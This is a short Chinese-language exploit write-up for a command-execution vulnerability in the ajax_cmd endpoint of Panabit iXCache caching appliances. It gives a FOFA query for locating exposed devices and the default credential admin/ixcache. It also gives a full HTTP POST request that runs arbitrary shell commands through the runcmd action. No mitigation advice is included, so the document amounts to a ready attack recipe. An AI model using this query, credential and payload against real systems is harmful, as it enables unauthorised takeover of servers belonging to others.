# Panabit iXCache ajax_cmd存在后台命令执行漏洞

# 一、漏洞简介
panabit缓存加速产品是一款基于派网公司自研的操作系统（PanaOS）上研发的内容缓存产品。iXCache依靠高稳定性、高可靠性两大特点，可缓存丰富的资源，目前支持Web视频、移动视频、Web音乐、移动音乐、软件下载、应用商店、游戏补丁等八大类资源的缓存。部署灵活、支持交换机镜像和Panabit牵引两种模式，满足不同级别的用户需求。panabit iXCache系统ajax_cmd存在命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。

# 二、影响版本
+ Panabit iXCache

# 三、资产测绘
+ fofa`<font style="color:rgb(255, 0, 0);">title="iXCache"</font>`
+ 特征

![1706801330303-6f77b29b-5337-4c00-9d58-6227a29488d7.png](./img/dxmkz2REfz98ryF9/1706801330303-6f77b29b-5337-4c00-9d58-6227a29488d7-202725.png)

# 四、漏洞复习
1. 使用弱口令`admin/ixcache`登陆系统,获取cookie

![1706801386353-66163cd9-4b54-4c2e-a39f-4d386894b78f.png](./img/dxmkz2REfz98ryF9/1706801386353-66163cd9-4b54-4c2e-a39f-4d386894b78f-952342.png)

2. 使用上一步获取的cookie，执行命令

```plain
POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ls HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: _walkthrough-introduction=0; pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331; pauser_1628486854_900424=paonline_admin_84071_16289322461
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0
```

![1706801708864-338c6ff8-4078-44a8-aa0a-e73d784b7807.png](./img/dxmkz2REfz98ryF9/1706801708864-338c6ff8-4078-44a8-aa0a-e73d784b7807-973503.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/provn8b8ocqxex5v>